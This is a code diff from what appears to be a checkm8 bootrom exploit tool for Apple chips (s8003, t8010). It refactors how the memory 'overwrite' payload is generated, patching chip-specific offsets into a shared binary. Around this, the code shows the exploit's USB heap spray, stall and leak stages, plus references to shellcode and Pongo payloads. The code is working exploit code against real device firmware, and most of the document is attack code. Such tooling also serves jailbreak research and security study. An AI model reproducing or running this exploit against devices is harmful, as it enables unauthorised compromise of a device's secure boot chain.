@@ -84,17 +84,16 @@ typedef struct {
 	uint32_t sz;
 } transfer_ret_t;
 
-extern uint8_t payloads_overwrite_s8003_bin[], payloads_overwrite_t8010_bin[];
-extern unsigned payloads_overwrite_s8003_bin_len, payloads_overwrite_t8010_bin_len;
+extern uint8_t payloads_overwrite_bin[];
+extern unsigned payloads_overwrite_bin_len;
 extern uint8_t payloads_yolo_s8003_bin[], payloads_yolo_t8010_bin[];
 extern unsigned payloads_yolo_s8003_bin_len, payloads_yolo_t8010_bin_len;
 
 extern uint8_t payloads_Pongo_bin[], payloads_shellcode_bin[];
 extern unsigned payloads_Pongo_bin_len, payloads_shellcode_bin_len;
 
-#include <payloads/overwrite_s8003.bin.h>
+#include <payloads/overwrite.bin.h>
 #include <payloads/yolo_s8003.bin.h>
-#include <payloads/overwrite_t8010.bin.h>
 #include <payloads/yolo_t8010.bin.h>
 
 #include <payloads/Pongo.bin.h>
@@ -852,6 +851,36 @@ checkm8_stage_spray(const usb_handle_t *handle) {
 	return true;
 }
 
+static void
+generate_overwrite(void **overwrite, size_t *overwrite_sz) {
+	*overwrite = calloc(1, payloads_overwrite_bin_len);
+	*overwrite_sz = 0;
+	memcpy(*overwrite, payloads_overwrite_bin, payloads_overwrite_bin_len);
+	*overwrite_sz += payloads_overwrite_bin_len;
+	uint32_t* offset = (uint32_t*)(*overwrite + 0x27);
+	LOG_DEBUG("before: %08x", *offset);
+	switch (cpid) {
+		case 0x8003:
+			LOG_DEBUG("creating overwrite for s8003");
+			*offset = 0x1803800;
+			break;
+		case 0x8010:
+			LOG_DEBUG("creating overwrite for s8010");
+			*offset = 0x1800B00;
+			break;
+		default:
+			LOG_ERROR("unknown cpid: %04x", cpid);
+			exit(EXIT_FAILURE);
+	}
+	LOG_DEBUG("after: %08x", *offset);
+	*overwrite_sz += 2;
+	for(size_t i = 0; i < *overwrite_sz - 2; i++) {
+		((uint8_t *)*overwrite)[*overwrite_sz - 1 - i] = ((uint8_t *)*overwrite)[*overwrite_sz - 3 - i];
+	}
+	((uint8_t *)*overwrite)[0] = 0x00;
+	((uint8_t *)*overwrite)[1] = 0x00;
+}
+
 static bool
 checkm8_stage_patch(const usb_handle_t *handle) {
 	size_t i, data_sz, packet_sz;
@@ -867,16 +896,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 			data_sz = 0;
 			memcpy(data, payloads_yolo_s8003_bin, payloads_yolo_s8003_bin_len);
 			data_sz += payloads_yolo_s8003_bin_len;
-			overwrite = calloc(1, payloads_overwrite_s8003_bin_len);
-			overwrite_sz = 0;
-			memcpy(overwrite, payloads_overwrite_s8003_bin, payloads_overwrite_s8003_bin_len);
-			overwrite_sz += payloads_overwrite_s8003_bin_len;
-			overwrite_sz += 2;
-			for(i = 0; i < overwrite_sz - 2; i++) {
-				((uint8_t *)overwrite)[overwrite_sz - 1 - i] = ((uint8_t *)overwrite)[overwrite_sz - 3 - i];
-			}
-			((uint8_t *)overwrite)[0] = 0;
-			((uint8_t *)overwrite)[1] = 0;
+			generate_overwrite(&overwrite, &overwrite_sz);
 			break;
 		case 0x8010:
 			LOG_DEBUG("setting up stage 2 for t8010");
@@ -884,16 +904,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 			data_sz = 0;
 			memcpy(data, payloads_yolo_t8010_bin, payloads_yolo_t8010_bin_len);
 			data_sz += payloads_yolo_t8010_bin_len;
-			overwrite = calloc(1, payloads_overwrite_t8010_bin_len);
-			overwrite_sz = 0;
-			memcpy(overwrite, payloads_overwrite_t8010_bin, payloads_overwrite_t8010_bin_len);
-			overwrite_sz += payloads_overwrite_t8010_bin_len;
-			overwrite_sz += 2;
-			for(i = 0; i < overwrite_sz - 2; i++) {
-				((uint8_t *)overwrite)[overwrite_sz - 1 - i] = ((uint8_t *)overwrite)[overwrite_sz - 3 - i];
-			}
-			((uint8_t *)overwrite)[0] = 0;
-			((uint8_t *)overwrite)[1] = 0;
+			generate_overwrite(&overwrite, &overwrite_sz);
 			if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
 				LOG_DEBUG("successfully leaked data");
 			} else {
@@ -1038,6 +1049,7 @@ int main(int argc, char **argv) {
 	usb_handle_t handle;
 	usb_timeout = 5;
 	usb_abort_timeout_min = 0;
+	LOG_INFO("Waiting for DFU mode device");
 	gaster_checkm8(&handle);
 	sleep(3);
 	checkm8_boot_pongo(&handle);
